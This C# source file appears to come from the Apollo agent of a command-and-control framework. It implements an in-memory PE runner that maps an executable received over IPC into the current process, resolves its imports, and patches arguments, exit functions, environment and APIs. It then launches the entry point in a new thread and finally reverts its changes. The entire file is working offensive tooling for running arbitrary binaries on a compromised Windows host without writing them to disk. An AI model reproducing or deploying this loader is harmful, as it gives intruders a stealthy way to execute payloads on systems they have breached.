using System;
using System.Runtime.InteropServices;
using System.Text;
using ApolloInterop.Structs.ApolloStructs;
using ExecutePE.Internals;
using ExecutePE.Patchers;

namespace ExecutePE;

public static class PERunner
{
    [DllImport("shell32.dll", SetLastError = true)]
    static extern IntPtr CommandLineToArgvW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
        out int pNumArgs);

    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr hMem);

    internal static Encoding encoding = Encoding.UTF8;

    public static void RunPE(ExecutePEIPCMessage message)
    {

        var peMapper = new PEMapper();
        peMapper.MapPEIntoMemory(message.Executable, out var pe, out var currentBase);

        var importResolver = new ImportResolver();
        importResolver.ResolveImports(pe, currentBase);

        peMapper.SetPagePermissions();

        var argumentHandler = new ArgumentHandler();
        if (!argumentHandler.UpdateArgs(message.ImageName, message.CommandLine))
        {
            throw new InvalidOperationException("Failed to update arguments");
        }

        var exitPatcher = new ExitPatcher();
        if (!exitPatcher.PatchExit())
        {
            throw new InvalidOperationException("Failed to patch exit function");
        }

        var extraEnvironmentalPatcher = new ExtraEnvironmentPatcher((IntPtr)currentBase);
        extraEnvironmentalPatcher.PerformExtraEnvironmentPatches();

        // Patch this last as may interfere with other activity
        var extraAPIPatcher = new ExtraAPIPatcher();

        if (!extraAPIPatcher.PatchAPIs((IntPtr)currentBase))
        {
            throw new InvalidOperationException("Failed to patch APIs");
        }

        StartExecution(pe, currentBase);

        // Revert changes
        exitPatcher.ResetExitFunctions();
        extraAPIPatcher.RevertAPIs();
        extraEnvironmentalPatcher.RevertExtraPatches();
        argumentHandler.ResetArgs();
        peMapper.ClearPE();
        importResolver.ResetImports();
    }

    private static void StartExecution(PELoader pe, long currentBase)
    {
        var threadStart = (IntPtr)(currentBase + (int)pe.OptionalHeader64.AddressOfEntryPoint);
        var hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
        NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
